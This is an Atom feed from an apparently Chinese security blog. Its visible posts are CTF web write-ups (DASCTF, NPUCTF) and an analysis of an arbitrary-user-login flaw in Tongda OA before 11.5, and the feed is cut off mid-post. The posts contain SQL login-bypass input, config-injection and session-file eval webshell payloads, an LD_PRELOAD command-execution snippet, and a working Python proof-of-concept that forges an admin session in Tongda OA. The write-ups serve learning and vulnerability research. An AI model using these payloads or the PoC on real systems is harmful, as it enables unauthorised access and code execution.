<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>glotozz&#39;blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://glotozz.github.io/"/>
  <updated>2020-04-28T12:15:14.541Z</updated>
  <id>https://glotozz.github.io/</id>
  
  <author>
    <name>glotozz</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>codeql学习及应用</title>
    <link href="https://glotozz.github.io/2020/04/28/codeql%E5%AD%A6%E4%B9%A0%E5%8F%8A%E5%BA%94%E7%94%A8/"/>
    <id>https://glotozz.github.io/2020/04/28/codeql%E5%AD%A6%E4%B9%A0%E5%8F%8A%E5%BA%94%E7%94%A8/</id>
    <published>2020-04-28T03:18:20.000Z</published>
    <updated>2020-04-28T12:15:14.541Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">password is required to continue reading.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="96d9f343d14082de8e500383e3d316668c0d8831a842536f04bd2ff64bce8e44"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted.
    
    </summary>
    
    
    
      <category term="工具" scheme="https://glotozz.github.io/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>java笔记</title>
    <link href="https://glotozz.github.io/2020/04/25/java%E7%AC%94%E8%AE%B0/"/>
    <id>https://glotozz.github.io/2020/04/25/java%E7%AC%94%E8%AE%B0/</id>
    <published>2020-04-25T15:29:29.000Z</published>
    <updated>2020-04-27T11:27:37.533Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">password is required to continue reading.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="1760f437c39c76ce3f216c96fec939642b38d236664be3574de63e480a3ba83c"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted.
    
    </summary>
    
    
    
      <category term="java" scheme="https://glotozz.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF-babytricks-wp</title>
    <link href="https://glotozz.github.io/2020/04/25/DASCTF-babytricks-wp/"/>
    <id>https://glotozz.github.io/2020/04/25/DASCTF-babytricks-wp/</id>
    <published>2020-04-25T08:10:35.000Z</published>
    <updated>2020-04-26T12:10:05.774Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"><a id="more"></a><p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p><!-- toc --><ul><li><a href="#一-格式化字符串万能密码">一、格式化字符串+万能密码</a></li><li><a href="#二">二、</a></li><li><a href="#三-bypass-disable_function">三、bypass disable_function</a></li></ul><!-- tocstop --><hr><h4><span id="一-格式化字符串万能密码">一、格式化字符串+万能密码</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where user&#x3D;&#39;$user&#39; and passwd&#x3D;&#39;%s&#39;</span><br></pre></td></tr></table></figure><p>格式化字符串，构造<code>%1$</code>可以吃掉user后面的单引号，<code>passwd=^0</code>，存在许多黑名单，发现<code>^</code>没有被过滤，<code>^0</code>成功登录</p><h4><span id="二">二、</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">'session'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'./init.php'</span>;</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"&lt;script&gt;window.location.href='./index.php'&lt;/script&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'shell'</span>])&#123;</span><br><span class="line">    $shell= addslashes($_GET[<span class="string">'shell'</span>]);</span><br><span class="line">    $file = file_get_contents(<span class="string">'./shell.php'</span>);</span><br><span class="line">    $file = preg_replace(<span class="string">"/\\\$shell = '.*';/s"</span>, <span class="string">"\$shell = '&#123;$shell&#125;';"</span>, $file);</span><br><span class="line">    file_put_contents(<span class="string">'./shell.php'</span>, $file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"set your shell"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    chdir(<span class="string">"/"</span>);</span><br><span class="line">    highlight_file(dirname(<span class="keyword">__FILE__</span>).<span class="string">"/admin.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.smi1e.top/%E5%B0%8F%E5%AF%86%E5%9C%88%E7%BB%8F%E5%85%B8%E5%86%99%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%87%A0%E7%A7%8D%E5%8F%98%E5%BD%A2%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">[小密圈]经典写配置漏洞与几种变形学习</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?shell&#x3D;;phpinfo();</span><br><span class="line">?shell&#x3D;$0</span><br></pre></td></tr></table></figure><h4><span id="三-bypass-disable_function">三、bypass disable_function</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,error_log,dl,FFI::cdef,debug_backtrace,imap_mail,mb_send_mail</span><br></pre></td></tr></table></figure><p>设置了<code>open_basedir</code></p><p>过滤了<code>mail()</code>、<code>error_log()</code>、<code>ini_set()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int preload()</span><br><span class="line">&#123;</span><br><span class="line">const char *command;</span><br><span class="line">int i;</span><br><span class="line">command &#x3D; getenv(&quot;EVIL_CMDLINE&quot;);</span><br><span class="line">return system(command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://www.anquanke.com/post/id/197745?from=singlemessage" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197745?from=singlemessage</a> </p></blockquote><p>fuzz能触发<code>ld_preload</code>的函数，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mb_send_mail</span><br><span class="line">exec</span><br><span class="line">system</span><br><span class="line">passthru</span><br><span class="line">shell_exec</span><br><span class="line">error_log</span><br><span class="line">mail</span><br><span class="line">gnupg_init</span><br><span class="line">imap_mail</span><br><span class="line">pcntl_exec</span><br><span class="line">new gnupg()</span><br></pre></td></tr></table></figure><p>这里可以用<code>new gnupg()</code>触发<code>ld_preload</code></p><p>还有个小疑问，为啥要给<code>so</code>文件</p>]]></content>
    
    <summary type="html">
    
      &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;
    
    </summary>
    
    
    
      <category term="wp" scheme="https://glotozz.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>社工库搭建</title>
    <link href="https://glotozz.github.io/2020/04/23/%E7%A4%BE%E5%B7%A5%E5%BA%93%E6%90%AD%E5%BB%BA/"/>
    <id>https://glotozz.github.io/2020/04/23/%E7%A4%BE%E5%B7%A5%E5%BA%93%E6%90%AD%E5%BB%BA/</id>
    <published>2020-04-23T03:58:52.000Z</published>
    <updated>2020-04-24T14:11:54.541Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">password is required to continue reading.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="53b9d88177ac1b1c22816c49436254ac7b656a19fcce575beacd1f0cd16fb932"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted.
    
    </summary>
    
    
    
      <category term="工具" scheme="https://glotozz.github.io/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>github资产监控</title>
    <link href="https://glotozz.github.io/2020/04/22/github%E8%B5%84%E4%BA%A7%E7%9B%91%E6%8E%A7/"/>
    <id>https://glotozz.github.io/2020/04/22/github%E8%B5%84%E4%BA%A7%E7%9B%91%E6%8E%A7/</id>
    <published>2020-04-22T14:38:48.000Z</published>
    <updated>2020-04-24T08:27:36.963Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">password is required to continue reading.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="f43743ca36a874a74bffa0d4e66944dd66599ba557c884913d0fecaeed7b4bc0"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted.
    
    </summary>
    
    
    
      <category term="工具" scheme="https://glotozz.github.io/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>fofa资产收集</title>
    <link href="https://glotozz.github.io/2020/04/22/fofa%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86/"/>
    <id>https://glotozz.github.io/2020/04/22/fofa%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86/</id>
    <published>2020-04-22T14:24:08.000Z</published>
    <updated>2020-04-23T10:42:47.366Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">password is required to continue reading.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="4d3c9d2977b1505a6c53ad70afeab95581cfab1591d6de87cfbaae89ce529cf3"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted.
    
    </summary>
    
    
    
      <category term="工具" scheme="https://glotozz.github.io/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>通达OA &lt; 11.5任意用户登录漏洞分析</title>
    <link href="https://glotozz.github.io/2020/04/22/%E9%80%9A%E8%BE%BEOA-11-5%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://glotozz.github.io/2020/04/22/%E9%80%9A%E8%BE%BEOA-11-5%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-04-22T09:43:04.000Z</published>
    <updated>2020-04-28T12:28:14.056Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"><a id="more"></a><p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p><!-- toc --><ul><li><a href="#环境搭建">环境搭建</a></li><li><a href="#漏洞分析">漏洞分析</a></li><li><a href="#漏洞复现">漏洞复现</a></li><li><a href="#参考链接">参考链接</a></li></ul><!-- tocstop --><hr><h4><span id="环境搭建">环境搭建</span></h4><p>下载通达<code>OA11.5</code></p><blockquote><p><a href="http://www.tongda2000.com/download/2019.php?F=&amp;K=" target="_blank" rel="noopener">http://www.tongda2000.com/download/2019.php?F=&amp;K=</a> </p></blockquote><p>官网没有提供<code>V11.4</code>，可以从<code>11.3</code>的服务器管理更新得到。</p><p>diff不同，最终找到任意用户登录漏洞触发点</p><h4><span id="漏洞分析">漏洞分析</span></h4><p><code>logincheck_code.php</code></p><p><img src="https://i.loli.net/2020/04/22/vwaKRXp38kFLiV2.png" alt="Snipaste_2020-04-22_20-52-39.png"></p><p><code>intval()</code>防止sql注入，但是这里用户可以伪造任意<code>UID</code>，默认admin用户的<code>UID</code>为1</p><p>需要绕过15行的判断，只要查询得到的<code>$login_codeuid</code>不为空即可。</p><p>跟进<code>get_cache()</code></p><p><img src="https://i.loli.net/2020/04/22/eSYg4VjXrmkRcpD.png" alt="Snipaste_2020-04-22_20-54-56.png"></p><p>根据传入的id进行查询</p><p>那么全局搜索调用<code>set_cache()</code>，并且设置<code>CODE_LOGIN</code>的地方，只有一处</p><p><code>general/login_code.php</code></p><p><img src="https://i.loli.net/2020/04/22/ZqfztVTs2rbpI8y.png" alt="Snipaste_2020-04-22_21-03-59.png"></p><p>那么可以通过这个页面读取<code>code_uid</code>，再去之前的页面伪造身份。</p><h4><span id="漏洞复现">漏洞复现</span></h4><p>1、</p><p><img src="https://i.loli.net/2020/04/22/yCGFucTiofnSZ7h.png" alt="Snipaste_2020-04-22_21-30-06.png"></p><p>2、</p><p><img src="https://i.loli.net/2020/04/22/bMdiBrn25mjv8PG.png" alt="Snipaste_2020-04-22_21-29-25.png"></p><p>3、</p><p><img src="https://i.loli.net/2020/04/22/AyNm3lcCRkiB7t9.png" alt="Snipaste_2020-04-22_21-28-39.png"></p><p>poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1:8088"</span></span><br><span class="line">url1 = url + <span class="string">"/general/login_code.php"</span></span><br><span class="line">url2 = url + <span class="string">"/logincheck_code.php"</span></span><br><span class="line">url3 = url + <span class="string">"/general/index.php"</span></span><br><span class="line">r = requests.get(url1).content</span><br><span class="line">tmp = re.search(<span class="string">r'code_uid":"(.*?)"&#125;'</span>, r.decode(<span class="string">"ISO-8859-1"</span>))  <span class="comment"># utf-8' codec can't decode byte</span></span><br><span class="line"><span class="comment"># print(tmp.group(1))</span></span><br><span class="line">codeuid = tmp.group(<span class="number">1</span>)</span><br><span class="line">r = requests.post(url2, data=&#123;<span class="string">'UID'</span>: <span class="number">1</span>, <span class="string">'CODEUID'</span>: codeuid&#125;).headers</span><br><span class="line">cookie = r[<span class="string">'Set-Cookie'</span>][:<span class="number">-7</span>]</span><br><span class="line"><span class="comment"># print(tmp)</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Cookie'</span>: cookie</span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url3, headers=headers).content</span><br><span class="line"><span class="keyword">if</span> <span class="string">"admin"</span> <span class="keyword">in</span> r.decode(<span class="string">"ISO-8859-1"</span>):</span><br><span class="line">    print(<span class="string">"ok"</span>)</span><br></pre></td></tr></table></figure><hr><h4><span id="参考链接">参考链接</span></h4><p> <a href="https://mp.weixin.qq.com/s/yJuLhC1GxkMbGL0mRORIoA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/yJuLhC1GxkMbGL0mRORIoA</a></p>]]></content>
    
    <summary type="html">
    
      &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;
    
    </summary>
    
    
    
      <category term="php代码审计" scheme="https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>NPUCTF-wp</title>
    <link href="https://glotozz.github.io/2020/04/20/NPUCTF-wp/"/>
    <id>https://glotozz.github.io/2020/04/20/NPUCTF-wp/</id>
    <published>2020-04-20T10:25:55.000Z</published>
    <updated>2020-04-27T12:25:28.609Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"><a id="more"></a><p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p><!-- toc --><ul><li><a href="#超简单的php超简单">超简单的PHP！！！超简单！！！</a></li><li><a href="#web">web🐕</a></li><li><a href="#realezphp">RealEzPHP</a></li><li><a href="#ezlogin">ezlogin</a></li><li><a href="#ezinclude">ezinclude</a></li><li><a href="#验证">验证🐎</a></li><li><a href="#ezshiro">ezShiro</a></li></ul><!-- tocstop --><hr><h3><span id="超简单的php超简单">超简单的PHP！！！超简单！！！</span></h3><p>文件包含读源码，主要是下面两个</p><p><code>/phpinfo.php</code></p><p><code>/msg.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">'content-type:application/json'</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($msg)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strlen($msg)&gt;<span class="number">17</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"msg is too loooong!"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> preg_replace(<span class="string">"/php/"</span>,<span class="string">"?"</span>,$msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'msg'</span>])&amp;<span class="keyword">empty</span>($_SESSION[<span class="string">'msg'</span>]))$_SESSION[<span class="string">'msg'</span>] = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'msg'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    array_push($_SESSION[<span class="string">'msg'</span>], [<span class="string">'msg'</span>=&gt;safe($_POST[<span class="string">'msg'</span>]),<span class="string">'time'</span>=&gt;date(<span class="string">'Y-m-d H:i:s'</span>,time())]);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>([<span class="string">'msg'</span>=&gt;safe($_POST[<span class="string">'msg'</span>]),<span class="string">'time'</span>=&gt;date(<span class="string">'Y-m-d H:i:s'</span>,time())]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_SESSION[<span class="string">'msg'</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> json_encode($_SESSION[<span class="string">'msg'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;<span class="keyword">echo</span> <span class="string">"è¿ä¸å¿«å»çè¨ï¼"</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将用户传入的msg写入session文件，给了<code>phpinfo()</code>可知session路径，配合文件包含getshell。</p><p>考点是限制了单次写入的<code>msg</code>要17字符以内，看比赛文档的时候看到了思路哈哈哈</p><p>1、利用反引号，但是这里<code>disable_func</code>中禁用了<code>shell_exec()</code>，无法使用。</p><p>2、利用短标签，这里也关闭了。</p><p>3、因为一次写入无法构造，可以利用注释符多次写入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?PHP  &#x2F;*</span><br><span class="line">*&#x2F;eval&#x2F;*</span><br><span class="line">*&#x2F;($_GET[a]);#</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>直观一点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msg|a:4:&#123;i:0;a:2:&#123;s:3:&quot;msg&quot;;s:9:&quot;&lt;?PHP  &#x2F;*&quot;;s:4:&quot;time&quot;;s:19:&quot;2020-04-20 19:34:56&quot;;&#125;i:1;a:2:&#123;s:3:&quot;msg&quot;;s:8:&quot;*&#x2F;eval&#x2F;*&quot;;s:4:&quot;time&quot;;s:19:&quot;2020-04-20 19:34:58&quot;;&#125;i:2;a:2:&#123;s:3:&quot;msg&quot;;s:14:&quot;*&#x2F;($_GET[a]);#&quot;;s:4:&quot;time&quot;;s:19:&quot;2020-04-20 19:35:09&quot;;&#125;i:3;a:2:&#123;s:3:&quot;msg&quot;;s:2:&quot;?&gt;&quot;;s:4:&quot;time&quot;;s:19:&quot;2020-04-20 19:35:17&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/20/kJztYlVnDCGyqEm.png" alt="Snipaste_2020-04-20_19-37-12.png"></p><p>最后bypass可以利用<code>error_log()</code>触发<code>ld_preload</code></p><h3><span id="web">web🐕</span></h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);   <span class="comment"># $key,$flag</span></span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);  <span class="comment">//定义加密方式</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, $key);    <span class="comment">//定义密钥</span></span><br><span class="line">define(<span class="string">"IV"</span>,<span class="string">"6666666666666666"</span>);    <span class="comment">//定义初始向量 16个6</span></span><br><span class="line">define(<span class="string">"BR"</span>,<span class="string">'&lt;br&gt;'</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))header(<span class="string">'location:./index.php?source=1'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#var_dump($GLOBALS);   //听说你想看这个？</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_encrypt</span><span class="params">($iv,$data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"--------encrypt---------"</span>.BR;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'IV:'</span>.$iv.BR;</span><br><span class="line">    <span class="keyword">return</span> base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_decrypt</span><span class="params">($iv,$data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'False'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'method'</span>]==<span class="string">'encrypt'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = IV;</span><br><span class="line">    $data = $flag;    </span><br><span class="line">    <span class="keyword">echo</span> aes_encrypt($iv,$data);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'method'</span>]==<span class="string">"decrypt"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = @$_POST[<span class="string">'iv'</span>];</span><br><span class="line">    $data = @$_POST[<span class="string">'data'</span>];</span><br><span class="line">    <span class="keyword">echo</span> aes_decrypt($iv,$data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"我摊牌了，就是懒得写前端"</span>.BR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'source'</span>]==<span class="number">1</span>)highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>传method=encrypt可以得到<code>IV</code>和<code>$flag</code>加密后的密文，</p><p>传method=decrypt可以对传入的<code>IV</code>和<code>data</code>进行解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">唯密文攻击：只知道密文</span><br><span class="line">已知明文攻击：得到了一些特定的明文与对应的密文</span><br><span class="line">选择明文攻击：攻击者可以任意选择一些明文，并得到对应的密文</span><br><span class="line">选择密文攻击：攻击者可以任意的制造或者选择一些密文，并得到对应的明文</span><br><span class="line">选择文本攻击：攻击者可以制造任意的明文&#x2F;密文，并得到对应的密文&#x2F;明文，也就是选择明文攻击+选择密文攻击</span><br></pre></td></tr></table></figure><p>这题符合CBC选择密文攻击，但是一般用来得到<code>IV</code>的，但是这里给了<code>IV</code></p><p>并且理论上可以直接将给我们的密文解密，返回了一个<code>1</code>，是因为增加了<code>openssl_decrypt() or 